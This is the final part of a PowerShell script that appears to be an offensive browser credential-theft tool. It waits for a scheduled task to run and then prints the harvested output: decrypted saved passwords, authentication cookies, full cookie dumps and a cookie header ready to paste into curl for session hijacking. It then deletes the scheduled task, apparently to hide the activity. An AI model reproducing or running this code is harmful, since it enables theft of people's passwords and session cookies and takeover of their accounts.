Write-Host "[*] Waiting for execution (${Timeout}s)..." -ForegroundColor Cyan
Start-Sleep -Seconds $Timeout

$result = (Get-ScheduledTaskInfo -TaskName $TaskName).LastTaskResult
if ($result -eq 0) {
    Write-Host "[+] Success !" -ForegroundColor Green

    Write-Host "`n--- Debug Log ---" -ForegroundColor Cyan
    Get-Content "$OutputDir\browser-decrypt-debug.log" -ErrorAction SilentlyContinue

    Write-Host "`n--- Passwords ---" -ForegroundColor Yellow
    Get-Content "$OutputDir\browser-passwords.log" -ErrorAction SilentlyContinue

    Write-Host "`n--- Cookies (auth) ---" -ForegroundColor Yellow
    Get-Content "$OutputDir\browser-cookies.log" -ErrorAction SilentlyContinue

    Write-Host "`n--- All Cookies (full dump files) ---" -ForegroundColor Cyan
    Get-ChildItem "$OutputDir\all-cookies-*.log" -ErrorAction SilentlyContinue | ForEach-Object {
        Write-Host "  [+] $($_.Name) ($([math]::Round($_.Length/1KB, 1)) KB)" -ForegroundColor Gray
    }

    Write-Host "`n--- Curl Cookie Header ---" -ForegroundColor Green
    Get-Content "$OutputDir\browser-cookies-curl.txt" -ErrorAction SilentlyContinue
} elseif ($result -eq 267009) {
    Write-Host "[*] Task still running (0x41301) - increase timeout. Partial results:" -ForegroundColor Yellow
    Get-Content "$OutputDir\browser-decrypt-debug.log" -ErrorAction SilentlyContinue
    Get-Content "$OutputDir\browser-passwords.log" -ErrorAction SilentlyContinue
} else {
    Write-Host "[-] Failed (LastTaskResult: $result)" -ForegroundColor Red
    Get-Content "$OutputDir\browser-decrypt-debug.log" -ErrorAction SilentlyContinue
}

Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
Write-Host "[*] Scheduled task deleted." -ForegroundColor Cyan
